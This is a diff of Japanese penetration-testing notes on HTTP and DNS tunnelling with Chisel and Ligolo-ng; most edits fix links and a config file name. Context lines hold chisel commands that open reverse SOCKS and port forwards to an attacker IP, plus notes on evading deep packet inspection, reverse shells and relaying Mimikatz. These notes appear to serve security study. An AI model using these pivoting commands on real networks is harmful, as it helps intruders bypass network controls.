@@ -8,9 +8,9 @@
 
 - ルールベースでトラフィックを監視するための技術で、侵害を示すパターンを指定しておく
 - これにより、外向けのSSHトラフィックを遮断され、[Port Redirection & SSH Port Forwarding](Port%20Redirection%20&%20SSH%20Port%20Forwarding.md)が失敗することがある
-- Deep Packet Inspectionを回避するために...
-	- HTTP通信が許可されているとき：[HTTP Tunneling](#HTTP%20Tunneling)
-	- DNS通信が許可されているとき：[DNS Tunneling](#DNS%20Tunneling)
+- **Deep Packet Inspectionを回避するために**...
+	- HTTP通信が許可されているとき：[HTTP Tunneling](HTTP・DNSトンネリング（Chisel,%20Ligolo-ng,%20Dnscat2）.md#HTTP%20Tunneling)
+	- DNS通信が許可されているとき：[DNS Tunneling](HTTP・DNSトンネリング（Chisel,%20Ligolo-ng,%20Dnscat2）.md#DNS%20Tunneling)
 
 ---
 ---
@@ -19,7 +19,7 @@
 
 ## HTTP Tunnelingの原理
 
-- 多くの現実的な構成として、HTTPのインバウンド通信のみが許可されている状況では、SSH通信によるポートフォワーディングも、リバースシェルの確立もできない
+- 初期侵入できた足場のマシンでHTTPのインバウンド通信のみが許可されている状況では、SSH通信によるポートフォワーディングも、リバースシェルの確立もできない
 - ここで、HTTPでトンネリングすることで、ローカルNW上にアクセスすることが可能になる
 	- SSH通信をHTTPでカプセル化するなども可能
 
@@ -56,7 +56,7 @@ chisel client <attacker_IP>:<bind_port> R:socks > /dev/null 2>&1 &
 ```
 ```zsh
 # 単純なリモートポートフォワーディングの場合
-chisel client <attacker_IP>:<bind_port> R:<dest_port>:<target_IP>:<port> &
+chisel client <attacker_IP>:<bind_port> R:<port|socks>:<target_IP>:<port> &
 ```
 - `R:`：
 	- target_IPに127.0.0.1と指定すれば、ターゲットのローカルサービスへアクセスできる
@@ -74,7 +74,7 @@ chisel client <attacker_IP>:<bind_port> R:<dest_port>:<target_IP>:<port> &
 sudo proxychains nmap -sT -p- -Pn -n <target_IP>
 ```
 - SOCK経由のSSHアクセスの場合：[22 - SSH](../../Ports%20-%20Service/22%20-%20SSH.md#SSHをSOCKSプロキシ経由で動かす)
-- socksを使うときは `/etc/proxychains4.con`に`socks5 127.0.0.1 1080`の設定を入れること
+- socksを使うときは `/etc/proxychains4.conf`に`socks5 127.0.0.1 1080`の設定を入れること
 - Proxychains は sudo と一緒に使う
 
 >[!TIP]
@@ -108,7 +108,7 @@ tcp_connect_time_out 800
 >ポートフォワーディング・トンネリング系でもっとも使いやすい。
 
 >[!NOTE]
->Go言語のversionが1.20以上でビルドされており、1.19以下のversionでビルドされたバイナリは存在せず、"'GLIBC_2.32' not found"のエラーが出たときは使えないため、[HTTP Tunneling w/ Chisel](#HTTP%20Tunneling%20w/%20Chisel)を使う。
+>Go言語のversionが1.20以上でビルドされており、1.19以下のversionでビルドされたバイナリは存在せず、"'GLIBC_2.32' not found"のエラーが出たときは使えないため、[HTTP Tunneling w/ Chisel](HTTP・DNSトンネリング（Chisel,%20Ligolo-ng,%20Dnscat2）.md#HTTP%20Tunneling%20w/%20Chisel)を使う。
 
 ### Ligolo-ngの仕組み
 
@@ -214,7 +214,7 @@ ip a show
 	- 例えばローカルNW内のマシンに対し、攻撃者の用意したHTTPサーバー経由でMimikatzを送りたいときなど
 
 - 通信方向：ローカルNWのAgent以外のマシン → 足場マシン(Agent)のlistener → トンネル → 攻撃者マシン
-- 以下、[Tunneling w/ Ligolo-ng](#Tunneling%20w/%20Ligolo-ng)のステップ７で`start`としてから実行するものとする
+- 以下、[Tunneling w/ Ligolo-ng](HTTP・DNSトンネリング（Chisel,%20Ligolo-ng,%20Dnscat2）.md#Tunneling%20w/%20Ligolo-ng)のステップ７で`start`としてから実行するものとする
 
 ### 具体的なユースケース：リバースシェル
 
